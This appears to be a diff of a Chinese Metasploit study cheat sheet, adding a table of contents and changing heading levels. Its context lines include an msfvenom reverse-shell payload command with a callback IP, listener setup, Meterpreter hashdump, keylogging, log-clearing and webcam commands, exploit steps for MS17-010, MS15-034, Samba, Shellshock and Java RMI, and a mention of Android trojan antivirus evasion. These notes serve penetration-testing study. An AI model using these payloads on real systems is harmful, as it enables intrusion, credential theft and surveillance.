@@ -1,6 +1,18 @@
-### 1. MSF 简单介绍
 
-#### 核心概念
+#### 目录
+- [MSF 简单介绍](#1-msf-简单介绍)
+- [MSF 基础命令与工作流程](#2-msf-基础命令与工作流程)
+- [MSF 数据库集成](#3-msf-数据库集成)
+- [MSF 模块详解](#4-msf-模块详解)
+- [MSFvenom](#5-msfvenom---payload-生成与编码)
+- [Multi/Handler](#6-multihandler---监听器)
+- [Meterpreter](#7-meterpreter---高级后渗透-shell)
+- [特定漏洞利用示例](#8-特定漏洞利用示例)
+- [高级技巧与其他](#9-高级技巧与其他)
+
+#### 1. MSF 简单介绍
+
+##### 核心概念
 1.  **Payload（攻击荷载）**:
     *   定义: 攻击成功后在目标主机执行的代码.
     *   存储: MSF 主目录下的 `payloads` 文件夹.
@@ -18,9 +30,9 @@
         *   `nops`: NOP 生成器，用于填充缓冲区.
     *   存储: `modules` 目录.
 
-### 2. MSF 基础命令与工作流程
+#### 2. MSF 基础命令与工作流程
 
-#### 常用命令
+##### 常用命令
 *   `msfconsole`: 启动 MSF 交互式控制台.
 *   `help`: 查看帮助菜单或特定命令的帮助 (`help search`).
 *   `search <关键字>`: 按关键字搜索模块.
@@ -51,7 +63,7 @@
 *   `ls`, `cd`, etc.: 支持许多标准的 Linux shell 命令.
 *   `exit`: 退出 MSF 控制台.
 
-#### 导入自定义模块
+##### 导入自定义模块
 1.  **下载模块**:
     ```bash
     git clone <CVE模块URL>
@@ -62,7 +74,7 @@
     *   确保模块代码格式兼容 MSF.
     *   运行 `reload_all` 命令使新模块生效.
 
-### 3. MSF 数据库集成
+#### 3. MSF 数据库集成
 
 *   **目的**: 存储扫描结果、主机信息、凭证等，方便管理和复用数据.
 *   **启动数据库服务** (通常是 PostgreSQL):
@@ -95,9 +107,9 @@
 *   **应用数据库数据**:
     *   `hosts -R`: 将数据库中当前工作区的所有主机设置为 RHOSTS.
 
-### 4. MSF 模块详解
+#### 4. MSF 模块详解
 
-#### Exploits 模块
+##### Exploits 模块
 *   **命名规则**: `平台/服务/名称` (e.g., `windows/smb/ms17_010_eternalblue`).
 *   **常用配置**:
     *   `RHOST` / `RHOSTS`: 目标 IP / 目标 IP 范围或列表.
@@ -107,7 +119,7 @@
     *   `LPORT`: 攻击者监听端口 (用于反向连接).
     *   `TARGET`: 有些模块需要指定具体的目标系统类型或版本.
 
-#### Payloads 模块
+##### Payloads 模块
 *   **命名规则**: `平台/类型/名称` (e.g., `windows/meterpreter/reverse_tcp`).
 *   **类型**:
     *   **Inline**: 单一的、完整的 Payload，体积较大，但可能更稳定.
@@ -119,7 +131,7 @@
     *   **VNCInject**: 注入 VNC 服务，提供图形界面访问.
     *   *其他类型*: 如 `patchup`, `upexec`, `dllinject`, `passive` 等.
 
-#### Auxiliary 模块
+##### Auxiliary 模块
 *   **作用**: 执行扫描、嗅探、拒绝服务 (DoS)、服务发现、版本探测等非直接利用漏洞的操作.
 *   **常用示例**:
     *   `auxiliary/scanner/portscan/tcp`: TCP 端口扫描.
@@ -128,12 +140,12 @@
     *   `auxiliary/server/capture/ftp`: 搭建假的 FTP 服务器捕获凭证.
     *   `auxiliary/admin/smb/ms17_010_command`: 通过 MS17-010 执行命令（若已有 DoublePulsar 后门）.
 
-#### Post 模块
+##### Post 模块
 *   **作用**: 在获得目标系统访问权限（如 Meterpreter 或 Shell 会话）后执行.
 *   **功能**: 信息收集、权限提升、持久化、内网漫游等.
 *   **使用**: 在会话 (Session) 中使用 `run <post_module_name>` 或 `run post/windows/gather/checkvm`.
 
-### 5. MSFvenom - Payload 生成与编码
+#### 5. MSFvenom - Payload 生成与编码
 
 *   **用途**: 独立于 `msfconsole` 的 Payload 生成器和编码器.
 *   **常用命令**:
@@ -165,7 +177,7 @@
         msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 LPORT=4444 -f raw -e php/base64 -o encoded_payload.txt
         ```
 
-### 6. Multi/Handler - 监听器
+#### 6. Multi/Handler - 监听器
 
 *   **用途**: 配合生成的 Payload（尤其是反向连接类型）使用，用于接收来自目标的回连并建立会话.
 *   **使用方法**:
@@ -177,12 +189,12 @@
     exploit -j                          # -j runs the listener as a background job
     ```
 
-### 7. Meterpreter - 高级后渗透 Shell
+#### 7. Meterpreter - 高级后渗透 Shell
 
 *   **获取**: 通常通过 `meterpreter/*` 类型的 Payload 获得.
 *   **常用命令** (在 Meterpreter 会话中输入 `help` 查看完整列表):
 
-    #### Core 命令
+    ##### Core 命令
     *   `background`: 将当前 Meterpreter 会话放入后台.
     *   `exit` / `quit`: 终止当前 Meterpreter 会话.
     *   `guid`: 获取会话的全局唯一标识符.
@@ -194,7 +206,7 @@
     *   `run <脚本名>` or `run <post_module>`: 执行 Meterpreter 脚本或后渗透模块.
     *   `sessions`: 快速切换到另一个会话.
 
-    #### 文件系统命令
+    ##### 文件系统命令
     *   `cd <目录>`: 更改目录.
     *   `ls` / `dir`: 列出当前目录内容.
     *   `pwd`: 打印当前工作目录.
@@ -205,14 +217,14 @@
     *   `upload <本地文件> <远程路径>`: 上传文件到目标.
     *   `download <远程文件> <本地路径>`: 从目标下载文件.
 
-    #### 网络命令
+    ##### 网络命令
     *   `arp`: 显示目标 ARP 缓存.
     *   `ifconfig` / `ipconfig`: 显示网络接口信息.
     *   `netstat`: 显示网络连接.
     *   `portfwd add -l <本地端口> -p <远程端口> -r <远程IP>`: 创建端口转发.
     *   `route`: 查看和修改路由表.
 
-    #### 系统命令
+    ##### 系统命令
     *   `clearev`: 清除事件日志.
     *   `execute -f <程序> [-a <参数>]`: 执行程序.
     *   `getpid`: 显示 Meterpreter 当前所在进程的 PID.
@@ -226,7 +238,7 @@
     *   `sysinfo`: 获取目标系统信息.
     *   `getsystem`: 尝试提升到 SYSTEM 权限.
 
-    #### 其他命令
+    ##### 其他命令
     *   `hashdump`: 转储 SAM 数据库中的密码哈希.
     *   `idletime`: 显示用户空闲时间.
     *   `keyscan_start`: 开始键盘记录.
@@ -239,9 +251,9 @@
     *   `webcam_snap`: 从摄像头拍照.
     *   `webcam_stream`: 从摄像头播放视频流.
 
-### 8. 特定漏洞利用示例
+#### 8. 特定漏洞利用示例
 
-#### MS17-010
+##### MS17-010
 *   **描述**: SMBv1 远程代码执行漏洞.
 *   **流程**:
     1.  **启动 MSF**: `msfconsole`
@@ -267,7 +279,7 @@
     5.  **执行攻击**: `exploit`
     6.  **结果**: 成功则获得 Meterpreter 会话.
 
-#### MS15-034
+##### MS15-034
 *   **描述**: HTTP.sys 处理畸形 Range 请求头时存在漏洞，主要导致 DoS，特定条件下可能 RCE.
 *   **原理**: 发送包含超大范围值的 `Range: bytes=0-18446744073709551615` 请求头.
 *   **流程**:
@@ -293,7 +305,7 @@
         ```
     4.  **结果**: 未打补丁的系统可能蓝屏或服务崩溃.
 
-#### Linux Samba 低版本漏洞
+##### Linux Samba 低版本漏洞
 *   **描述**: 较早的 Samba 版本存在多个漏洞，如 `is_known_pipename` (CVE-2017-7494) 或更早的命令执行漏洞。
 *   **流程**:
     1.  **探测**:
@@ -319,7 +331,7 @@
         # Or: script /dev/null -c bash
         ```
 
-#### Shellshock
+##### Shellshock
 *   **描述**: Bash 处理环境变量时存在缺陷 (CVE-2014-6271, CVE-2014-6278)，可通过 CGI 等途径触发远程命令执行.
 *   **流程**:
     1.  **探测**: Use specialized scanners or manual tests targeting CGI scripts.
@@ -333,7 +345,7 @@
         exploit
         ```
 
-#### Java RMI Server Deserialization
+##### Java RMI Server Deserialization
 *   **描述**: Java RMI 注册表或服务在处理反序列化数据时可能存在漏洞，导致 RCE.
 *   **流程**:
     1.  **探测**:
@@ -350,7 +362,7 @@
         exploit
         ```
 
-### 9. 高级技巧与其他
+#### 9. 高级技巧与其他
 
 *   **Android 木马免杀**:
     *   **工具**: `backdoor-apk`, `Apktool`.
